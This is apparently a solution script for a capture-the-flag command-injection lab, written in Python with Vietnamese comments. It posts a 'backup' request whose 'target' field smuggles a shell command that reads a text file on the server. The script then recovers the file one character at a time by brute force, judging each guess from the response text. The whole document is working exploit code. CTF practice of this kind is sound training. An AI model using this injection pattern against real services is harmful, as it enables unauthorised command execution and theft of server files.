import requests 
import string

url = "https://cmdi.cyberjutsu-lab.tech:12006/"
charset = string.ascii_letters + string.digits + string.punctuation # đây là tất cả các kí tự để bruteforce

flag = ""
baseQuery = "a -r .; if [ \"$(cat /*.txt|cut -c{})\" = \"{}\" ]; then echo '123'; else echo 'zip error'; fi;"
# dùng lệnh cut để lấy từng kí tự trong file .txt để so với mỗi kí tự trong charset, nếu không bằng nhau thì trả về 'zip error'
while True:
    for char in charset:
        realQuery = baseQuery.format(len(flag)+1, char) # đây là câu lệnh để bruteforce
        data = {"command": "backup", "target": realQuery} # các parameter của post request
        res = requests.post(url, data= data) # gửi request post đến url
        if "không" not in res.text: # nếu backup thành công thì in kí tự đó ra màn hình
            flag = flag + char
            break
    print(flag)